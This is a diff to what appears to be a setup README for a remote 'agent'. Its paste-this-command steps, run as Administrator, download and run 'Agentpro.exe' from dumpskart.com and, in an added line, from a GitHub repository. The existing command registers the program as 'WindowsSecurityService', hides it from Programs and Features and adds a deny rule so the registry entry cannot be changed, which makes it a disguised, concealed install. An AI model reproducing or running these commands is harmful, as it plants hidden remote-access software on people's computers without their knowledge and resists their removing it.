@@ -28,7 +28,11 @@ curl -L -o "C:\Program Files\Agentpro.exe" "https://dumpskart.com/Mesh/Agentpro.
 echo [1/4] Downloading agent... && curl -L -o "C:\Program Files\Agentpro.exe" "https://dumpskart.com/Mesh/Agentpro.exe" && echo [2/4] Installing agent... && "C:\Program Files\Agentpro.exe" -fullinstall && timeout /t 10 /nobreak >nul && echo [3/4] Hiding from Programs and Features... && reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WindowsSecurityService" /v "SystemComponent" /t REG_DWORD /d 1 /f && echo [4/4] Locking registry... && powershell -Command "$acl = Get-Acl 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WindowsSecurityService'; $rule = New-Object System.Security.AccessControl.RegistryAccessRule('NT AUTHORITY\SYSTEM','SetValue','Deny'); $acl.AddAccessRule($rule); Set-Acl 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WindowsSecurityService' $acl" && echo [5/5] Cleaning up... && del /f /q "C:\Program Files\Agentpro.exe" && echo. && echo Installation complete! 
 Run the following command in **Command Prompt (Run as Administrator)**:
 ```
-
+### Uninstall
+```
+echo [1/3] Removing registry lock... && powershell -Command "$acl = Get-Acl 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WindowsSecurityService'; $rule = New-Object System.Security.AccessControl.RegistryAccessRule('NT AUTHORITY\SYSTEM','SetValue','Deny'); $acl.RemoveAccessRule($rule); Set-Acl 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WindowsSecurityService' $acl" && echo [2/3] Uninstalling agent... && "C:\Program Files\Windows Security Service\WindowsSecurityService\WindowsSecurityService.exe" -fulluninstall && echo [3/3] Cleaning registry... && reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WindowsSecurityService" /f && echo. && echo Uninstall complete!
+```
+### Github
 ```cmd
 curl -L -o "C:\Program Files\Agentpro.exe" "https://github.com/SellerDumpskart/Setup/raw/refs/heads/main/AgentproGithub.exe" && "C:\Program Files\Agentpro.exe" -fullinstall
 ```
